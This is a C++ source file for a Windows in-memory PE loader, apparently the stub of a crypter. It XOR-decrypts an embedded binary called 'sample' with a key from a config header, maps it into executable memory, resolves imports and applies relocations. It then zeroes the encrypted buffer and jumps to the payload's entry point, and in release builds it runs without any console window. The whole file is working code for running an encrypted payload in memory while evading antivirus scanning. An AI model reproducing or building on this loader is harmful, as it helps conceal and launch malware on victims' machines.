#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <vector>
#include <regex>
#include "sample.h"
#include "config.h"

HMODULE hModule2;
LPVOID lpReserved2;

#define NEW_ADDRESS 0x10000

// Define a macro for the debug printf
#ifdef _DEBUG
#define DEBUG_PRINTF(format, ...) printf(format, __VA_ARGS__)
#else
#define DEBUG_PRINTF(format, ...)
#endif

/*
Works with :
- 32bit exe
        dll

        Relocs doesn't work for some exe for some reasons

- XOR decrypts the PE
- Doesn't copy headers
*/

void decrypt(const char* key, int offset = 0, int limit = -1) {
	//START
    size_t key_size = strlen(key);
    const int bufferSize = sizeof(sample) / sizeof(sample[0]);
    if (limit == -1) limit = bufferSize;
	if (key_size == 0) return;
    for (int i = offset; i < limit ; i++) {
        sample[i] ^= key[i%key_size];
    }
	//END
}

// This function will load a DLL from a buffer into the current process.
// The DLL is expected to be in the PE format.
//
// Parameters:
// - dll_buffer: a buffer containing the DLL file to be loaded.
// - dll_size: the size of the DLL buffer, in bytes.
//
// Returns:
// - a handle to the loaded DLL, if successful.
// - NULL, if the DLL could not be loaded.
HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
{
	//START
    // Check if the DLL buffer is at least as large as the size of the DOS header.
    if (dll_size < sizeof(IMAGE_DOS_HEADER)) {
        return NULL;
    }

	decrypt(KEY, 0, 1024); // decrypt only the header
	
    // Get a pointer to the DOS header.
    const IMAGE_DOS_HEADER* dos_header = static_cast<const IMAGE_DOS_HEADER*>(dll_buffer);

    // Check if the DLL buffer is at least as large as the size of the NT headers.
    if (dll_size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
        return NULL;
    }

    // Get a pointer to the NT headers.
    const IMAGE_NT_HEADERS* nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS*>(static_cast<const char*>(dll_buffer) + dos_header->e_lfanew);

    // Check if the DLL is a valid 32-bit or 64-bit PE file.
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Calculate the size of the image.
    const size_t image_size = nt_headers->OptionalHeader.SizeOfImage;

    // Allocate memory for the DLL in the current process.
    void* image_base = VirtualAlloc((LPVOID)newBase, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (image_base == NULL) {
        return NULL;
    }

    // Get a pointer to the section headers.
    const IMAGE_SECTION_HEADER* section_headers = reinterpret_cast<const IMAGE_SECTION_HEADER*>(nt_headers + 1);

    // Copy the section data to the allocated memory.
    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
        const IMAGE_SECTION_HEADER* section_header = section_headers + i;
		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //decrypt section
        memcpy(static_cast<char*>(image_base) + section_header->VirtualAddress, static_cast<const char*>(dll_buffer) + section_header->PointerToRawData, section_header->SizeOfRawData);
		decrypt(KEY, section_header->PointerToRawData, section_header->PointerToRawData + section_header->SizeOfRawData); //encrypt back section
	}
    
    DEBUG_PRINTF("[+] Wrote section data\n");

    //Rebasing symbols
    DEBUG_PRINTF("[+] Rebasing Dll\n");
    HMODULE dll_handle = static_cast<HMODULE>(image_base);


    // Get the address of the DLL's entry point.
    const void* entry_point = static_cast<const char*>(image_base) + nt_headers->OptionalHeader.AddressOfEntryPoint;

    // Get the address of the DLL's import directory.
    const IMAGE_IMPORT_DESCRIPTOR* import_directory = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(static_cast<const char*>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    DEBUG_PRINTF("[+] Fixing imports\n");
    // Iterate through the import directory and resolve the imported functions.
    while (import_directory->Name != 0) {
        // Get the name of the imported DLL.
        const char* import_dll_name = static_cast<const char*>(image_base) + import_directory->Name;

        // Load the imported DLL.
        HMODULE import_dll = LoadLibraryA(import_dll_name);
        if (import_dll == NULL) {
            VirtualFree(image_base, 0, MEM_RELEASE);
            return NULL;
        }

        // Get the address of the imported functions.
        IMAGE_THUNK_DATA* import_thunk_data = reinterpret_cast<IMAGE_THUNK_DATA*>(static_cast<char*>(image_base) + import_directory->FirstThunk);

        // Resolve the imported functions.
		while (import_thunk_data->u1.AddressOfData != 0) {
			// Check if the import is by ordinal
			if (IMAGE_SNAP_BY_ORDINAL(import_thunk_data->u1.Ordinal)) {
				// Get the ordinal value
				DWORD ordinal = IMAGE_ORDINAL(import_thunk_data->u1.Ordinal);

				// Get the address of the imported function by ordinal
				void* import_address = GetProcAddress(import_dll, reinterpret_cast<LPCSTR>(ordinal));

				// Write the address of the imported function to the IAT.
				if (import_address != nullptr) {
					*reinterpret_cast<void**>(import_thunk_data) = import_address;
				}
			}
			else {
				// Get the import by name
				const IMAGE_IMPORT_BY_NAME* import_by_name = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(static_cast<const char*>(image_base) + import_thunk_data->u1.AddressOfData);

				// Get the address of the imported function by name
				void* import_address = GetProcAddress(import_dll, reinterpret_cast<const char*>(import_by_name->Name));

				// Write the address of the imported function to the IAT.
				if (import_address != nullptr) {
					*reinterpret_cast<void**>(import_thunk_data) = import_address;
				}
			}

			++import_thunk_data;
		}

        ++import_directory;
    }

    DEBUG_PRINTF("[+] Doing relocation\n");

    // Get the address of the DLL's base relocation directory.
    const IMAGE_BASE_RELOCATION* base_relocation = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(static_cast<const char*>(image_base) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    // Calculate the delta between the original base address and the new base address.
    DWORD delta = newBase - nt_headers->OptionalHeader.ImageBase;

    // Iterate through the base relocation directory and apply the relocations.
    while (base_relocation->VirtualAddress != 0) {
        // Get the relocation block header.
        const WORD* relocation_block = reinterpret_cast<const WORD*>(base_relocation + 1);

        // Calculate the number of relocations in the current block.
        DWORD num_relocations = (base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        // Apply each relocation in the current block.
        for (DWORD i = 0; i < num_relocations; ++i) {
            // Get the current relocation entry.
            WORD relocation_entry = relocation_block[i];

            // Extract the type and offset from the relocation entry.
            WORD type = relocation_entry >> 12;
            WORD offset = relocation_entry & 0xFFF;

            // Get a pointer to the address to be relocated.
            DWORD* reloc_address = reinterpret_cast<DWORD*>(static_cast<char*>(image_base) + base_relocation->VirtualAddress + offset);

            // Apply the relocation based on the type.
            switch (type) {
            case IMAGE_REL_BASED_ABSOLUTE:
                // The relocation is skipped if the type is absolute.
                break;

            case IMAGE_REL_BASED_HIGHLOW:
                // Adjust the address by adding the delta.
                *reloc_address += delta;
                break;

            default:
                // Handle other relocation types if necessary.
                // ...
                break;
            }
        }

        // Move to the next relocation block.
        base_relocation = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(reinterpret_cast<const char*>(base_relocation) + base_relocation->SizeOfBlock);
    }

    DEBUG_PRINTF("\n[+] Calling DllMain\n");
    // Call the DLL's entry point, if it has one.
    if (entry_point != NULL) {
        // Get the address of the DLL's entry point in the IAT.
        void* entry_point_iat = static_cast<char*>(image_base) + nt_headers->OptionalHeader.AddressOfEntryPoint;

        // Cleaning
        dll_buffer = "";
		size_t sample_size = sizeof(sample) / sizeof(sample[0]);
		for (size_t i = 0; i < sample_size; i++) {
			sample[i] = 0;
		}

        // Call the DLL's entry point.
        reinterpret_cast<bool(__stdcall*)(HMODULE, DWORD, LPVOID)>(entry_point_iat)(hModule2, DLL_PROCESS_ATTACH, lpReserved2);
    }

    // Return a handle to the loaded DLL.
    return dll_handle;
	//END
}

void allo() {
	//START
    AllocConsole();
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout); // output only
	//END
}

#ifdef _DEBUG
int main(void)
#else
int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCmdLine,int       nShowCmd)
#endif
{
	//START

#ifdef _DEBUG
    allo();
#endif

    DEBUG_PRINTF("[+] Started\n");

    // Load the DLL from a buffer in memory
    const int bufferSize = sizeof(sample) / sizeof(sample[0]);
	
    HMODULE dll = RunPE(sample, bufferSize, NEW_ADDRESS);
    if (dll == NULL) {
        DEBUG_PRINTF("[-] Failed to load DLL\n");
        return 1;
    }

    // Free the DLL
    ::FreeLibrary(dll);

    return 0;
	//END
}
